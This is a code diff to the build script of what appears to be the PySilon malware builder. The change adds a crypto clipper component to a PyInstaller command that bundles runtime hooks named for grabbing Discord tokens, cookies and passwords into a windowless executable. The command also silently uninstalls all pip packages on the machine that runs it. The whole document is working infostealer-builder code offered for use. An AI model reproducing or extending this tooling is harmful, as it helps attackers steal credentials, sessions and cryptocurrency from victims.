@@ -15,10 +15,10 @@ def compile():
     if 'configuration.ini' in os.listdir('.'): config.read('configuration.ini')
     else: input('Configuration file not found! Press ENTER to terminate...'); sys.exit(0)
 
-    if len(config['SETTINGS']) != 12 or len(config['FUNCTIONALITY']) != 16:
+    if len(config['SETTINGS']) != 12 or len(config['FUNCTIONALITY']) != 17:
         return 'Config corrupted'
 
-    compiling_command = 'start cmd /k "title Reorganising packages... & pip freeze > to_uninstall.txt & pip uninstall -y -r to_uninstall.txt > nul & del to_uninstall.txt > nul & pip install pillow > nul & pip install pyinstaller > nul & pip install -r custom_imports.txt > nul & title Compiling source code... & pyinstaller -F --noconsole --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py --runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py --icon "' + config['SETTINGS']['icon_path'] + '" "source_prepared.py" > nul & echo - & echo.Done & echo.- & start dist & del source_prepared.spec > nul & rmdir build /S /Q & pause & exit"'
+    compiling_command = 'start cmd /k "title Reorganising packages... & pip freeze > to_uninstall.txt & pip uninstall -y -r to_uninstall.txt > nul & del to_uninstall.txt > nul & pip install pillow > nul & pip install pyinstaller > nul & pip install -r custom_imports.txt > nul & title Compiling source code... & pyinstaller -F --noconsole --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py --runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py --add-data="crypto_clipper.json;." --icon "' + config['SETTINGS']['icon_path'] + '" "source_prepared.py" > nul & echo - & echo.Done & echo.- & start dist & del source_prepared.spec > nul & rmdir build /S /Q & pause & exit"'
 
     with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
     with open('source_assembled.py', 'r', encoding='utf-8') as copy_source_code: source_code = copy_source_code.readlines()
